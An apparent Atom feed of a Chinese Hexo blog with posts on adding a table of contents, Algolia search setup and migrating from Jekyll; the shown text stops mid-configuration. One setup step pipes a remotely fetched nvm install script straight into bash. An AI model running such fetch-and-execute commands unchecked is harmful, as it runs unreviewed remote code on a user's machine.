<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pa55w0rd &#39;s Blog</title>
  
  <subtitle>记录</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://pa55w0rd.github.io/"/>
  <updated>2018-11-21T08:48:33.495Z</updated>
  <id>http://pa55w0rd.github.io/</id>
  
  <author>
    <name>Pa55w0rd</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hexo添加文章目录</title>
    <link href="http://pa55w0rd.github.io/%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95/"/>
    <id>http://pa55w0rd.github.io/添加文章目录/</id>
    <published>2018-11-21T08:15:18.000Z</published>
    <updated>2018-11-21T08:48:33.495Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有的文章比较长，翻页查阅比较麻烦，添加文章目录功能</p><h2 id="0x01-添加文章目录"><a href="#0x01-添加文章目录" class="headerlink" title="0x01 添加文章目录"></a>0x01 添加文章目录</h2><a id="more"></a><h3 id="添加css样式"><a href="#添加css样式" class="headerlink" title="添加css样式"></a>添加css样式</h3><p>打开<code>themes\Landscape-x\source\css\_partial\article.styl</code>，添加下面代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 新添加的 */</span></span><br><span class="line"><span class="selector-id">#container</span> <span class="selector-class">.show-toc-btn</span>,<span class="selector-id">#container</span> <span class="selector-class">.toc-article</span>&#123;<span class="attribute">display</span>:block&#125;</span><br><span class="line"><span class="selector-class">.toc-article</span>&#123;<span class="attribute">z-index</span>:<span class="number">100</span>;<span class="attribute">background</span>:<span class="number">#fff</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#ccc</span>;<span class="attribute">max-width</span>:<span class="number">250px</span>;<span class="attribute">min-width</span>:<span class="number">150px</span>;<span class="attribute">max-height</span>:<span class="number">500px</span>;<span class="attribute">overflow-y</span>:auto;<span class="attribute">-webkit-box-shadow</span>:<span class="number">5px</span> <span class="number">5px</span> <span class="number">2px</span> <span class="number">#ccc</span>;<span class="attribute">box-shadow</span>:<span class="number">5px</span> <span class="number">5px</span> <span class="number">2px</span> <span class="number">#ccc</span>;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">padding</span>:<span class="number">10px</span>;<span class="attribute">position</span>:fixed;<span class="attribute">right</span>:<span class="number">35px</span>;<span class="attribute">top</span>:<span class="number">129px</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-close</span>&#123;<span class="attribute">font-weight</span>:<span class="number">700</span>;<span class="attribute">font-size</span>:<span class="number">20px</span>;<span class="attribute">cursor</span>:pointer;<span class="attribute">float</span>:right;<span class="attribute">color</span>:<span class="number">#ccc</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-close</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">color</span>:<span class="number">#000</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc</span>&#123;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">padding</span>:<span class="number">0</span>;<span class="attribute">line-height</span>:<span class="number">20px</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc</span> <span class="selector-class">.toc-number</span>&#123;<span class="attribute">color</span>:<span class="number">#333</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc</span> <span class="selector-class">.toc-text</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">text-decoration</span>:underline;<span class="attribute">color</span>:<span class="number">#2a6496</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-tag">li</span>&#123;<span class="attribute">list-style-type</span>:none&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-level-1</span>&#123;<span class="attribute">margin</span>:<span class="number">4px</span> <span class="number">0</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-child</span>&#123;&#125;@-<span class="keyword">moz</span>-<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;@-<span class="keyword">webkit</span>-<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;@-<span class="keyword">o</span>-<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;@<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;<span class="selector-class">.show-toc-btn</span>&#123;<span class="attribute">display</span>:none;<span class="attribute">z-index</span>:<span class="number">10</span>;<span class="attribute">width</span>:<span class="number">30px</span>;<span class="attribute">min-height</span>:<span class="number">14px</span>;<span class="attribute">overflow</span>:hidden;<span class="attribute">padding</span>:<span class="number">4px</span> <span class="number">6px</span> <span class="number">8px</span> <span class="number">5px</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#ddd</span>;<span class="attribute">border-right</span>:none;<span class="attribute">position</span>:fixed;<span class="attribute">right</span>:<span class="number">40px</span>;<span class="attribute">text-align</span>:center;<span class="attribute">background-color</span>:<span class="number">#f9f9f9</span>&#125;<span class="selector-class">.show-toc-btn</span> <span class="selector-class">.btn-bg</span>&#123;<span class="attribute">margin-top</span>:<span class="number">2px</span>;<span class="attribute">display</span>:block;<span class="attribute">width</span>:<span class="number">16px</span>;<span class="attribute">height</span>:<span class="number">14px</span>;<span class="attribute">background</span>:<span class="built_in">url</span>(http://7xtawy.com1.z0.glb.clouddn.com/show.png) no-repeat;<span class="attribute">-webkit-background-size</span>:<span class="number">100%</span>;<span class="attribute">-moz-background-size</span>:<span class="number">100%</span>;<span class="attribute">background-size</span>:<span class="number">100%</span>&#125;<span class="selector-class">.show-toc-btn</span> <span class="selector-class">.btn-text</span>&#123;<span class="attribute">color</span>:<span class="number">#999</span>;<span class="attribute">font-size</span>:<span class="number">12px</span>&#125;<span class="selector-class">.show-toc-btn</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">cursor</span>:pointer&#125;<span class="selector-class">.show-toc-btn</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.btn-bg</span>&#123;<span class="attribute">background-position</span>:<span class="number">0</span> -<span class="number">16px</span>&#125;<span class="selector-class">.show-toc-btn</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.btn-text</span>&#123;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">color</span>:<span class="number">#ea8010</span>&#125;</span><br><span class="line"><span class="selector-class">.toc-article</span> <span class="selector-tag">li</span> <span class="selector-tag">ol</span>, <span class="selector-class">.toc-article</span> <span class="selector-tag">li</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.toc-article</span> <span class="selector-tag">ol</span>, <span class="selector-class">.toc-article</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改article-ejs文件"><a href="#修改article-ejs文件" class="headerlink" title="修改article.ejs文件"></a>修改article.ejs文件</h3><p>使用的是Hexo的toc函数，<a href="https://hexo.io/zh-cn/docs/helpers#toc" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/helpers#toc</a></p><p>打开 <code>themes\Landscape-x\layout\_partial\article.ejs</code>，在<code>&lt;header&gt;</code>标签添加下面代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 目录内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (!<span class="attr">index</span> &amp;&amp; <span class="attr">post.toc</span>)&#123; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"show-toc-btn"</span> <span class="attr">id</span>=<span class="string">"show-toc-btn"</span> <span class="attr">onclick</span>=<span class="string">"showToc();"</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"btn-bg"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"btn-text"</span>&gt;</span>文章导航<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"toc-article"</span> <span class="attr">class</span>=<span class="string">"toc-article"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"toc-close"</span> <span class="attr">class</span>=<span class="string">"toc-close"</span> <span class="attr">title</span>=<span class="string">"隐藏导航"</span> <span class="attr">onclick</span>=<span class="string">"showBtn();"</span>&gt;</span>×<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span> <span class="attr">class</span>=<span class="string">"toc-title"</span>&gt;</span>文章目录<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">%-</span> <span class="attr">toc</span>(<span class="attr">post.content</span>) %&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">showToc</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> toc_article = <span class="built_in">document</span>.getElementById(<span class="string">"toc-article"</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> show_toc_btn = <span class="built_in">document</span>.getElementById(<span class="string">"show-toc-btn"</span>);</span></span><br><span class="line"><span class="actionscript">toc_article.setAttribute(<span class="string">"style"</span>,<span class="string">"display:block"</span>);</span></span><br><span class="line"><span class="actionscript">show_toc_btn.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none"</span>);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">showBtn</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> toc_article = <span class="built_in">document</span>.getElementById(<span class="string">"toc-article"</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> show_toc_btn = <span class="built_in">document</span>.getElementById(<span class="string">"show-toc-btn"</span>);</span></span><br><span class="line"><span class="actionscript">toc_article.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none"</span>);</span></span><br><span class="line"><span class="actionscript">show_toc_btn.setAttribute(<span class="string">"style"</span>,<span class="string">"display:block"</span>);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 目录内容结束 --&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="添加目录"><a href="#添加目录" class="headerlink" title="添加目录"></a>添加目录</h3><p>在文章开头添加 <code>toc: true</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;有的文章比较长，翻页查阅比较麻烦，添加文章目录功能&lt;/p&gt;
&lt;h2 id=&quot;0x01-添加文章目录&quot;&gt;&lt;a href=&quot;#0x01-添加文章目录&quot; class=&quot;headerlink&quot; title=&quot;0x01 添加文章目录&quot;&gt;&lt;/a&gt;0x01 添加文章目录&lt;/h2&gt;
    
    </summary>
    
      <category term="note" scheme="http://pa55w0rd.github.io/categories/note/"/>
    
    
      <category term="hexo" scheme="http://pa55w0rd.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>use_algolia_search</title>
    <link href="http://pa55w0rd.github.io/use-algolia-search/"/>
    <id>http://pa55w0rd.github.io/use-algolia-search/</id>
    <published>2018-11-20T06:04:40.000Z</published>
    <updated>2018-11-21T09:09:21.950Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>去<a href="https://www.algolia.com" target="_blank" rel="noopener">algolia</a>官网注册账号</p></li><li><p>新建index索引 Blog</p></li></ol><a id="more"></a><ol start="3"><li>在hex项目下安装 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># npm install hexo-algolia --save</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># export HEXO_ALGOLIA_INDEXING_KEY=xxxxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hexo algolia</span></span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Testing HEXO_ALGOLIA_INDEXING_KEY permissions.</span><br><span class="line"><span class="builtin-name">INFO</span>  Start processing</span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Identified 45 pages <span class="keyword">and</span> posts <span class="keyword">to</span> index.</span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Indexing chunk 1 of 1 (50 items each)</span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Indexing done.</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;&lt;p&gt;去&lt;a href=&quot;https://www.algolia.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;algolia&lt;/a&gt;官网注册账号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;新建index索引 Blog&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="note" scheme="http://pa55w0rd.github.io/categories/note/"/>
    
    
      <category term="hexo" scheme="http://pa55w0rd.github.io/tags/hexo/"/>
    
      <category term="algolia" scheme="http://pa55w0rd.github.io/tags/algolia/"/>
    
  </entry>
  
  <entry>
    <title>jekyll迁移hexo</title>
    <link href="http://pa55w0rd.github.io/jekyll%E8%BF%81%E7%A7%BBhexo/"/>
    <id>http://pa55w0rd.github.io/jekyll迁移hexo/</id>
    <published>2018-11-19T08:19:09.000Z</published>
    <updated>2018-11-21T09:09:33.619Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><a id="more"></a><h2 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h2><p>操作系统：Windows 10 子系统 Ubuntu 18.04 </p><p>使用apt install nodejs &amp;&amp; apt install npm 安装之后npm不能用</p><p>通过源码安装，npm也不能用</p><p>node还好，npm就是不能用，最后通过nvm安装成功</p><h3 id="安装node-npm"><a href="#安装node-npm" class="headerlink" title="安装node + npm"></a>安装node + npm</h3><ul><li><p>安装nvm</p>  <figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># source ~/.bashrc</span></span><br></pre></td></tr></table></figure></li><li><p>使用nvm</p>  <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># nvm ls-remote   <span class="comment">//列出远程所有可用版本</span></span><br><span class="line"># nvm install <span class="number">10.13</span><span class="number">.0</span> <span class="comment">//目前稳定LTS版</span></span><br><span class="line"># nvm ls <span class="comment">//查看已安装版本</span></span><br><span class="line"># nvm use <span class="number">10.13</span><span class="number">.0</span> <span class="comment">//切换到版本</span></span><br><span class="line"><span class="comment">//如果想把某个版本设为默认，可以这么做：</span></span><br><span class="line"># nvm alias <span class="section">default</span> <span class="number">10.13</span><span class="number">.0</span></span><br><span class="line"># nvm use <span class="section">default</span></span><br></pre></td></tr></table></figure></li><li><p>换源</p><p>  官方源可能会被墙，需要换源</p><p>  使用源管理工具 nrm</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># npm i -g nrm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nrm ls</span></span><br><span class="line"></span><br><span class="line"><span class="string">*</span> <span class="string">npm</span> <span class="bullet">----</span> <span class="attr">https://registry.npmjs.org/</span></span><br><span class="line">  <span class="string">cnpm</span> <span class="meta">---</span> <span class="attr">http://r.cnpmjs.org/</span></span><br><span class="line">  <span class="string">taobao</span> <span class="bullet">-</span> <span class="attr">https://registry.npm.taobao.org/</span></span><br><span class="line">  <span class="string">nj</span> <span class="bullet">-----</span> <span class="attr">https://registry.nodejitsu.com/</span></span><br><span class="line">  <span class="string">rednpm</span> <span class="bullet">-</span> <span class="attr">http://registry.mirror.cqupt.edu.cn/</span></span><br><span class="line">  <span class="string">npmMirror</span>  <span class="attr">https://skimdb.npmjs.com/registry/</span></span><br><span class="line">  <span class="string">edunpm</span> <span class="bullet">-</span> <span class="attr">http://registry.enpmjs.org/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nrm use taobao  //切换淘宝源</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><pre><code><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># apt-get install git</span></span><br></pre></td></tr></table></figure></code></pre><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre><code><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-<span class="keyword">cli</span></span><br></pre></td></tr></table></figure></code></pre><h2 id="0x02-简单使用"><a href="#0x02-简单使用" class="headerlink" title="0x02 简单使用"></a>0x02 简单使用</h2><h3 id="初始化-init"><a href="#初始化-init" class="headerlink" title="初始化 init"></a>初始化 init</h3><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo init &lt;folder&gt;</span></span><br><span class="line"><span class="meta"># cd &lt;folder&gt;</span></span><br><span class="line"><span class="meta"># npm install</span></span><br></pre></td></tr></table></figure></p><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="variable">_config</span>.yml     <span class="comment">//配置信息</span></span><br><span class="line">├── package.json    <span class="comment">//应用程序信息</span></span><br><span class="line">├── scaffolds       <span class="comment">//模板文件夹</span></span><br><span class="line">├── source      <span class="comment">//资源文件夹</span></span><br><span class="line">|   ├── <span class="variable">_drafts</span></span><br><span class="line">|   └── <span class="variable">_posts</span>  <span class="comment">//文章</span></span><br><span class="line">└── themes      <span class="comment">//主题文件夹</span></span><br></pre></td></tr></table></figure><h3 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h3><p>创建 Hexo 主题非常容易，您只要在 themes 文件夹内，新增一个任意名称的文件夹，并修改 _config.yml 内的 theme 设定，即可切换主题。一个主题可能会有以下的结构：<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── languages</span><br><span class="line">├── <span class="keyword">layout</span></span><br><span class="line">├── scripts</span><br><span class="line">└── <span class="keyword">source</span></span><br></pre></td></tr></table></figure></p><p><strong>_config.yml</strong></p><p>主题的配置文件。修改时会自动更新，无需重启服务器。</p><h3 id="新建文章-new"><a href="#新建文章-new" class="headerlink" title="新建文章 new"></a>新建文章 new</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo new [layout] <span class="meta-string">&lt;title&gt;</span></span></span><br></pre></td></tr></table></figure><p>新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p><h3 id="生成静态文件-generate"><a href="#生成静态文件-generate" class="headerlink" title="生成静态文件 generate"></a>生成静态文件 generate</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># hexo <span class="keyword">generate</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>-d, –deploy</td><td>文件生成后立即部署网站</td></tr><tr><td>-w, –watch</td><td>监视文件变动</td></tr></tbody></table><h3 id="启动本地服务器-server"><a href="#启动本地服务器-server" class="headerlink" title="启动本地服务器 server"></a>启动本地服务器 server</h3><p>hexo3.0 把服务器独立成单独的模块，需要先安装才能使用<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># npm install hexo-server --save</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># hexo server</span></span><br></pre></td></tr></table></figure></p><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>-p, –port</td><td>重设端口</td></tr><tr><td>-s, –static</td><td>只使用静态文件</td></tr><tr><td>-l, –log</td><td>启动日记记录，使用覆盖记录格式</td></tr></tbody></table><h3 id="部署-deploy"><a href="#部署-deploy" class="headerlink" title="部署 deploy"></a>部署 deploy</h3><p>Hexo 提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。</p><p>先安装<code>hexo-deployer-git</code>模块</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># npm install hexo-deployer-git --save</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># hexo deploy</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-g, –generate</td><td>部署之前预先生成静态文件</td></tr></tbody></table><p>在 <code>_config.yml</code> 中修改参数，可以同时使用多个deployer<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line">  <span class="attribute">type</span>: 